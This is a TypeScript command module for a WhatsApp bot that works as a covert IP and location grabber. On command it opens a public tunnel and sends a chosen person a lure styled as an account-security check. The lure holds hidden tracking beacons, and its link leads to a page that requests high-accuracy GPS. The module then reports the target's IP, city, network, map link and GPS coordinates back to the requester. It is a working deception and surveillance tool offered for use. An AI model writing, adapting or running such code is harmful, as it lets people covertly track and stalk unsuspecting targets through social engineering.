import { randomUUID } from "node:crypto";
import { spawn, execFileSync } from "node:child_process";
import { createServer, type Server } from "node:http";
import { promises as fs, existsSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── store ───────────────────────── */

type Sess = {
  id: string;
  requester: string;
  target: string;
  cmdMsg: any;
  hits: Set<string>;
  createdAt: number;
};

const G = globalThis as any;
const sessions: Map<string, Sess> = (G.__wipSessions ??= new Map());
const sockRef: { current: any } = (G.__wipSock ??= { current: null });
const startedRef: { current: boolean } = (G.__wipStarted ??= { current: false });

const PORT = Number(process.env.WIP_PORT || 8788);
const TTL = 24 * 60 * 60 * 1000;
const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
const log = (...a: any[]) => process.env.WIP_DEBUG === "1" && console.log("[wip]", ...a);

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function sweep() {
  const now = Date.now();
  for (const [id, s] of sessions) if (now - s.createdAt > TTL) sessions.delete(id);
}

/* ───────────────────────── permisos ───────────────────────── */

async function allowed(ctx: any): Promise<boolean> {
  const jid: string = ctx.sender || (ctx.msg?.key?.participant ?? ctx.from);
  const num = String(jid).split("@")[0].split(":")[0];

  try {
    if (ctx.isOwner === true) return true;
    if (typeof ctx.isOwner === "function" && ctx.isOwner(jid)) return true;
    if (ctx.owner === true) return true;
  } catch {}

  const env = String(process.env.WIP_OWNERS || process.env.OWNERS || process.env.OWNER || "")
    .split(",").map((s) => s.replace(/\D/g, "")).filter(Boolean);
  if (env.includes(num)) return true;

  const db: any = ctx.db;
  if (!db) return false;

  try {
    if (db.isPremium?.(jid) === true) return true;
    const rec = (await db.getUser?.(jid)) ?? (await db.getPremium?.(jid)) ?? db.getBot?.(jid);
    if (rec === true) return true;
    if (rec && (rec.premium || rec.isPremium || rec.vip || rec.pro)) return true;
    if (rec && /premium|pro|vip|max|owner/i.test(String(rec.plan || rec.tier || rec.rank || rec.role || ""))) return true;
  } catch {}

  return false;
}

/* ───────────────────────── cloudflared ───────────────────────── */

function binDir() {
  for (const d of [path.join(process.cwd(), ".wip"), path.join(tmpdir(), "wip-cf")]) {
    try { mkdirSync(d, { recursive: true }); return d; } catch {}
  }
  return path.join(tmpdir(), "wip-cf");
}

const BIN_DIR = binDir();
const BIN = path.join(BIN_DIR, process.platform === "win32" ? "cloudflared.exe" : "cloudflared");

function asset(): string | null {
  const a = process.arch;
  if (process.platform === "linux") return a === "x64" ? "cloudflared-linux-amd64" : a === "arm64" ? "cloudflared-linux-arm64" : a === "arm" ? "cloudflared-linux-arm" : null;
  if (process.platform === "win32") return a === "ia32" ? "cloudflared-windows-386.exe" : "cloudflared-windows-amd64.exe";
  if (process.platform === "darwin") return a === "arm64" ? "cloudflared-darwin-arm64.tgz" : "cloudflared-darwin-amd64.tgz";
  return null;
}

async function ensureBin(): Promise<string | null> {
  if (existsSync(BIN)) return BIN;
  const n = asset();
  if (!n) return null;
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), 15000);
  try {
    const r = await fetch(`https://github.com/cloudflare/cloudflared/releases/latest/download/${n}`, { redirect: "follow", signal: c.signal });
    if (!r.ok) return null;
    const b = Buffer.from(await r.arrayBuffer());
    if (b.length < 100_000) return null;
    if (n.endsWith(".tgz")) {
      const tmp = path.join(BIN_DIR, "cf.tgz");
      await fs.writeFile(tmp, b);
      execFileSync("tar", ["-xzf", tmp, "-C", BIN_DIR], { stdio: "ignore" });
      await fs.unlink(tmp).catch(() => undefined);
    } else await fs.writeFile(BIN, b);
    await fs.chmod(BIN, 0o755).catch(() => undefined);
    return BIN;
  } catch { return null; } finally { clearTimeout(t); }
}

/* ───────────────────────── túnel ───────────────────────── */

const SSH = ["-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "ServerAliveInterval=20", "-o", "ExitOnForwardFailure=yes", "-o", "ConnectTimeout=10"];

function has(cmd: string) {
  for (const [b, a] of [["which", [cmd]], ["sh", ["-c", `command -v ${cmd}`]]] as const) {
    try { execFileSync(b, a as string[], { stdio: "ignore" }); return true; } catch {}
  }
  return false;
}

const tun = (G.__wipTun ??= { url: "", proc: null as any, tries: 0, lastErr: "" });

function base() {
  const shared = (G.__locTunnel?.url || "").trim();
  return (process.env.WIP_BASE_URL || "").replace(/\/+$/, "") || tun.url || shared;
}

function kill() { try { tun.proc?.kill("SIGKILL"); } catch {} tun.proc = null; tun.url = ""; }

async function alive(u: string) {
  try {
    const c = new AbortController();
    const t = setTimeout(() => c.abort(), 4000);
    const r = await fetch(`${u}/__hc`, { signal: c.signal });
    clearTimeout(t);
    return r.ok;
  } catch { return false; }
}

type P = { cmd: string; args: string[]; re: RegExp };

function prov(name: string, bin: string | null): P | null {
  const npx = process.platform === "win32" ? "npx.cmd" : "npx";
  if (name === "cf") return bin ? { cmd: bin, args: ["tunnel", "--url", `http://127.0.0.1:${PORT}`, "--no-autoupdate"], re: /https:\/\/[a-z0-9-]+\.trycloudflare\.com/i } : null;
  if (name === "lhr") return has("ssh") ? { cmd: "ssh", args: [...SSH, "-R", `80:localhost:${PORT}`, "nokey@localhost.run"], re: /https:\/\/[a-z0-9-]+\.lhr\.life/i } : null;
  if (name === "serveo") return has("ssh") ? { cmd: "ssh", args: [...SSH, "-R", `80:localhost:${PORT}`, "serveo.net"], re: /https:\/\/[a-z0-9-]+\.serveo\.net/i } : null;
  if (name === "lt") return has(npx) ? { cmd: npx, args: ["--yes", "localtunnel", "--port", String(PORT)], re: /https:\/\/[a-z0-9-]+\.loca\.lt/i } : null;
  return null;
}

const ORDER = ["cf", "lhr", "serveo", "lt"];

function open(bin: string | null): Promise<string> {
  const p = prov(ORDER[tun.tries % ORDER.length], bin);
  if (!p) { tun.tries++; return Promise.resolve(""); }

  return new Promise((res) => {
    let done = false;
    let ch: any;
    try { ch = spawn(p.cmd, p.args, { stdio: ["ignore", "pipe", "pipe"] }); } catch { tun.tries++; return res(""); }
    tun.proc = ch;
    const fin = (v: string) => { if (done) return; done = true; clearTimeout(tm); res(v); };
    const on = (b: Buffer) => {
      const m = b.toString().match(p.re);
      if (m && !tun.url) { tun.url = m[0].replace(/\/+$/, ""); tun.tries = 0; log("tunnel", tun.url); fin(tun.url); }
    };
    ch.stdout?.on("data", on); ch.stderr?.on("data", on);
    ch.on("exit", () => { if (tun.proc === ch) { tun.proc = null; tun.url = ""; } if (!done) { tun.tries++; tun.lastErr = "exit"; fin(""); } });
    ch.on("error", () => { tun.proc = null; tun.tries++; fin(""); });
    const tm = setTimeout(() => { if (!tun.url) { try { ch.kill("SIGKILL"); } catch {} tun.proc = null; tun.tries++; fin(""); } }, 16000);
  });
}

async function ensureBase(): Promise<string> {
  const cur = base();
  if (cur && (await alive(cur))) return cur;
  kill();
  const bin = await ensureBin();
  for (let i = 0; i < 5; i++) {
    const u = await open(bin);
    if (!u) { await sleep(600); continue; }
    for (let k = 0; k < 6; k++) { if (await alive(u)) return u; await sleep(1500); }
    kill();
  }
  return "";
}

/* ───────────────────────── geo ───────────────────────── */

function ipOf(req: any) {
  const h = req.headers || {};
  const raw = h["cf-connecting-ip"] || h["x-real-ip"] || String(h["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "";
  const ip = String(raw).replace(/^::ffff:/, "").trim();
  return ip === "::1" || ip === "127.0.0.1" ? "" : ip;
}

async function geo(ip: string) {
  try {
    const r = await fetch(ip ? `https://ipapi.co/${ip}/json/` : "https://ipapi.co/json/", { headers: { "User-Agent": "wip" } });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { ip: j.ip, city: j.city, region: j.region, country: j.country_name, org: j.org, lat: j.latitude, lon: j.longitude };
  } catch { return null; }
}

/* ───────────────────────── aviso al solicitante ───────────────────────── */

async function report(s: Sess, req: any, channel: string, gps?: { lat: number; lon: number; acc: number }) {
  const ip = ipOf(req);
  const key = `${ip}|${channel}|${gps ? Math.round(gps.lat * 200) : 0}`;
  if (s.hits.has(key)) return;
  s.hits.add(key);

  const sock = sockRef.current;
  if (!sock) return;

  const g = await geo(ip);
  const num = s.target.split("@")[0].split(":")[0];

  if (!g && !gps) {
    await sock.sendMessage(s.requester, {
      text: `📡 *${num}* abrió el señuelo\nCanal: \`${channel}\`\nIP: \`${ip || "no legible"}\``,
      mentions: [s.requester],
    }, { quoted: s.cmdMsg }).catch(() => undefined);
    return;
  }

  const lat = gps?.lat ?? g?.lat;
  const lon = gps?.lon ?? g?.lon;
  const place = g ? [g.city, g.region, g.country].filter(Boolean).join(", ") : "GPS";

  const lines = [
    `🎯 *${num}* cayó`,
    ``,
    `IP: \`${g?.ip || ip || "?"}\``,
    `Lugar: *${place || "desconocido"}*`,
    g?.org ? `Red: ${g.org}` : "",
    lat && lon ? `https://maps.google.com/?q=${lat},${lon}` : "",
    gps ? `_GPS ±${gps.acc} m_` : "",
    `Canal: \`${channel}\``,
    `Hora: ${new Date().toLocaleString("es-MX")}`,
  ].filter(Boolean);

  await sock.sendMessage(s.requester, { text: lines.join("\n"), mentions: [s.requester] }, { quoted: s.cmdMsg }).catch(() => undefined);
}

/* ───────────────────────── servidor ───────────────────────── */

const CORS: Record<string, string> = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, Bypass-Tunnel-Reminder",
};

function out(res: any, code: number, type: string, body: any) {
  res.writeHead(code, { "Content-Type": type, "Cache-Control": "no-store", ...CORS });
  res.end(body);
}

function pageHtml(sid: string, b: string) {
  return `<!DOCTYPE html><html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><title>Verificando…</title>
<style>body{margin:0;background:#070b14;color:#e9edf7;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;text-align:center}
.b{padding:22px}.t{font-size:19px;font-weight:800;color:#00e5ff;margin-bottom:8px}.s{font-size:13px;color:#8fa3c4}
img{width:100%;max-width:340px;border-radius:12px;margin-top:14px;border:1px solid #22304d}</style></head>
<body><div class="b"><div class="t">📍 Ubicación verificada</div>
<div class="s" id="s">Obteniendo datos…</div><div id="o"></div></div>
<script>
var S=${JSON.stringify(sid)},B=${JSON.stringify(b)};
function show(d){document.getElementById('s').textContent=(d.city||'')+' '+(d.country||'');
document.getElementById('o').innerHTML='<img src="'+B+'/m/'+S+'?lat='+d.lat+'&lon='+d.lon+'">'}
fetch(B+'/g/'+S).then(r=>r.json()).then(function(d){if(d.lat){show(d);
fetch(B+'/l/'+S+'?src=ip&lat='+d.lat+'&lon='+d.lon);
if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(p){
fetch(B+'/l/'+S+'?src=gps&lat='+p.coords.latitude+'&lon='+p.coords.longitude+'&acc='+Math.round(p.coords.accuracy||0));
show({lat:p.coords.latitude,lon:p.coords.longitude})},function(){},{enableHighAccuracy:true,timeout:9000})}}).catch(function(){});
</script></body></html>`;
}

async function handle(req: any, res: any) {
  if (req.method === "OPTIONS") return out(res, 204, "text/plain", "");
  const u = new URL(req.url || "/", `http://${req.headers.host || "localhost"}`);
  const p = u.pathname;

  if (p === "/__hc") return out(res, 200, "text/plain", "ok");

  const beacon = p.match(/^\/p\/([A-Za-z0-9_-]{6,48})\.gif$/);
  if (beacon) {
    out(res, 200, "image/gif", GIF);
    const s = sessions.get(beacon[1]);
    if (s) await report(s, req, u.searchParams.get("c") || "img");
    return;
  }

  const js = p.match(/^\/j\/([A-Za-z0-9_-]{6,48})\.js$/);
  if (js) {
    const s = sessions.get(js[1]);
    if (s) await report(s, req, "script");
    return out(res, 200, "application/javascript", "window.__wip=1;");
  }

  const g = p.match(/^\/g\/([A-Za-z0-9_-]{6,48})$/);
  if (g) {
    const d = await geo(ipOf(req));
    if (!d) return out(res, 200, "application/json", '{"ok":false}');
    return out(res, 200, "application/json", JSON.stringify({ ok: true, ...d }));
  }

  const l = p.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
  if (l) {
    out(res, 200, "image/gif", GIF);
    const s = sessions.get(l[1]);
    if (!s) return;
    const lat = Number(u.searchParams.get("lat")) || 0;
    const lon = Number(u.searchParams.get("lon")) || 0;
    if (lat && lon) await report(s, req, u.searchParams.get("src") === "gps" ? "gps" : "ip", { lat, lon, acc: Number(u.searchParams.get("acc")) || 0 });
    else await report(s, req, "pixel");
    return;
  }

  const m = p.match(/^\/m\/([A-Za-z0-9_-]{6,48})$/);
  if (m) {
    const lat = Number(u.searchParams.get("lat"));
    const lon = Number(u.searchParams.get("lon"));
    if (!lat || !lon) return out(res, 400, "text/plain", "");
    const key = process.env.GMAPS_KEY;
    const src = key
      ? `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=15&size=600x280&markers=color:red%7C${lat},${lon}&key=${key}`
      : `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=15&size=600,280&l=map&pt=${lon},${lat},pm2rdm`;
    try {
      const up = await fetch(src, { headers: { "User-Agent": "Mozilla/5.0" } });
      const buf = Buffer.from(await up.arrayBuffer());
      if (!up.ok || buf.length < 200) throw 0;
      return out(res, 200, up.headers.get("content-type") || "image/png", buf);
    } catch { return out(res, 302, "text/plain", ""); }
  }

  const v = p.match(/^\/v\/([A-Za-z0-9_-]{6,48})$/);
  if (v) {
    const s = sessions.get(v[1]);
    if (!s) return out(res, 410, "text/html", "<h1>Expirado</h1>");
    await report(s, req, "browser");
    return out(res, 200, "text/html; charset=utf-8", pageHtml(v[1], base()));
  }

  out(res, 404, "text/plain", "");
}

function startServer() {
  if (startedRef.current) return;
  startedRef.current = true;
  const srv: Server = createServer((rq, rs) => handle(rq, rs).catch(() => { try { out(rs, 500, "text/plain", ""); } catch {} }));
  srv.on("error", (e: any) => { if (e?.code === "EADDRINUSE") console.log(`[wip] puerto ${PORT} ocupado`); });
  srv.listen(PORT, () => console.log(`[wip] escuchando :${PORT}`));
  setInterval(sweep, 10 * 60 * 1000).unref?.();
  process.once("exit", kill);
}

/* ───────────────────────── señuelo ───────────────────────── */

function decoy(sid: string, b: string, name: string, msg: string) {
  const host = (() => { try { return new URL(b).host; } catch { return b; } })();
  const B = `${b}/p/${sid}.gif`;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#06090f;color:#eef2fb;padding:12px}
.c{max-width:420px;margin:0 auto;background:linear-gradient(170deg,#101728,#070b12);border:1px solid #23304d;border-radius:18px;overflow:hidden}
.h{display:flex;align-items:center;gap:9px;padding:13px 15px;border-bottom:1px solid #1a2740;background:linear-gradient(90deg,rgba(0,229,255,.1),transparent)}
.d{width:9px;height:9px;border-radius:50%;background:#00e5ff;box-shadow:0 0 10px #00e5ff}
.t{font-size:11.5px;letter-spacing:1.3px;font-weight:800;text-transform:uppercase;color:#9fe9ff}
.b{padding:16px}
.hi{font-size:15px;font-weight:700;margin-bottom:6px}.hi b{color:#00e5ff}
.m{font-size:13px;color:#b9c8e0;line-height:1.5;margin-bottom:14px}
.a{display:block;text-align:center;padding:12px;border-radius:11px;font-weight:800;font-size:13.5px;color:#04121a;text-decoration:none;background:linear-gradient(180deg,#00e5ff,#00a8cc)}
.f{padding:10px 15px;border-top:1px solid #1a2740;font-size:10px;color:#5f7396;display:flex;justify-content:space-between}
img.bn{position:absolute;width:1px;height:1px;opacity:.01}
</style>
<div class="c">
<div class="h"><div class="d"></div><div class="t">Verificación</div></div>
<div class="b">
<div class="hi">Hola <b>@__NAME__</b></div>
<div class="m">__MSG__</div>
<a class="a" href="__BASE__/v/__SID__" target="_blank">Ver ubicación</a>
</div>
<div class="f"><span>solo tú ves esto</span><span id="st">·</span></div>
</div>
<img class="bn" src="${B}?c=img0" alt="">
<script>
var B=__BASEJSON__,S=__SIDJSON__,C=0;
function hit(c){try{var i=new Image();i.src=B+'/p/'+S+'.gif?c='+c+'_'+Date.now()}catch(e){}}
function css(c){try{var d=document.createElement('div');d.style.cssText='position:absolute;width:1px;height:1px;background:url('+B+'/p/'+S+'.gif?c='+c+')';document.body.appendChild(d)}catch(e){}}
function tag(t,attr,c){try{var e=document.createElement(t);e.setAttribute(attr,B+'/p/'+S+'.gif?c='+c);e.style.cssText='position:absolute;width:1px;height:1px;opacity:.01';document.body.appendChild(e)}catch(e){}}
try{document.getElementById('st').textContent='·';}catch(e){}
hit('img1');css('css');css('css2');
tag('audio','src','audio');tag('video','poster','poster');tag('iframe','src','iframe');tag('embed','src','embed');
try{var lk=document.createElement('link');lk.rel='preload';lk.as='image';lk.href=B+'/p/'+S+'.gif?c=preload';document.head.appendChild(lk)}catch(e){}
try{var ff=document.createElement('style');ff.textContent='@font-face{font-family:wipx;src:url('+B+'/p/'+S+'.gif?c=font)}';document.head.appendChild(ff);
var sp=document.createElement('span');sp.style.cssText='position:absolute;font-family:wipx';sp.textContent='x';document.body.appendChild(sp)}catch(e){}
try{var sc=document.createElement('script');sc.src=B+'/j/'+S+'.js';document.body.appendChild(sc)}catch(e){}
try{fetch(B+'/p/'+S+'.gif?c=fetch').catch(function(){})}catch(e){}
try{if(navigator.sendBeacon)navigator.sendBeacon(B+'/p/'+S+'.gif?c=beacon')}catch(e){}
try{setTimeout(function(){hit('late1')},1500);setTimeout(function(){hit('late2')},4000)}catch(e){}
</script>`;

  return {
    __typename: "GenAIUnifiedResponseSection",
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        payload: html
          .replace(/__NAME__/g, name)
          .replace(/__MSG__/g, msg)
          .replace(/__BASE__/g, b)
          .replace(/__BASEJSON__/g, JSON.stringify(b))
          .replace(/__SIDJSON__/g, JSON.stringify(sid))
          .replace(/__SID__/g, sid),
        url: b,
        trusted_sources: [host],
      },
    },
  };
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["wip", "whatsip", "sacip", "ip"],
  category: "system",
  description: "Señuelo de IP: envía un DM y, al abrirlo, te llega su IP y ubicación. Solo premium y owners.",
  premiumOnly: true,
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const info: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
    const requester: string = (msg.key as any).participant || from;

    const a0 = (args[0] || "").trim();
    const raw = a0.replace(/\D/g, "");
    const quoted: string | undefined = info.participant;

    let target: string;
    if (raw.length >= 8) target = `${raw}@s.whatsapp.net`;
    else if (quoted) target = quoted;
    else if (info.mentionedJid?.length) target = info.mentionedJid[0];
    else {
      await reply("Uso: `.wip 5215512345678` o responde a alguien con `.wip`.").catch(() => undefined);
      return;
    }

    if (target.endsWith("@g.us")) {
      await reply("Ese es un grupo, pásame un número o responde a una persona.").catch(() => undefined);
      return;
    }

    const custom = args.slice(1).join(" ").trim();
    const text = custom || "Hay un movimiento en tu cuenta. Verifica tu ubicación para continuar.";

    await react("🛰️").catch(() => undefined);
    startServer();

    const b = await ensureBase();
    if (!b) {
      await react("❌").catch(() => undefined);
      await reply(`Sin túnel: ${tun.lastErr || "no se pudo abrir"}`).catch(() => undefined);
      return;
    }

    const sid = randomUUID().replace(/-/g, "").slice(0, 24);
    const num = target.split("@")[0].split(":")[0];

    let name = num;
    try {
      const meta: any = await sock.groupMetadata(from).catch(() => null);
      const p = meta?.participants?.find((x: any) => x.id === target);
      name = String(p?.name || p?.notify || "").trim() || num;
    } catch {}

    sessions.set(sid, { id: sid, requester, target, cmdMsg: msg, hits: new Set(), createdAt: Date.now() });
    sockRef.current = sock;

    try {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("🛰️ Señuelo // LuferOS")
        .setFooter("toca el botón para verificar");

      rich.addSection(decoy(sid, b, name, text));
      await rich.send(target);

      /* segundo canal: enlace plano, abre navegador real */
      await sleep(400);
      await sock.sendMessage(target, { text: `🔗 ${b}/v/${sid}` }).catch(() => undefined);

      await react("✅").catch(() => undefined);

      await reply(
        `🛰️ Señuelo enviado a *${name}* (+${num}).\n\n` +
          `Te aviso aquí en cuanto lo abra. Enlace: ${b}/v/${sid}`,
      ).catch(() => undefined);
    } catch (e: any) {
      await react("❌").catch(() => undefined);
      await reply(`Error: ${e?.message || e}`).catch(() => undefined);
    }
  },
};
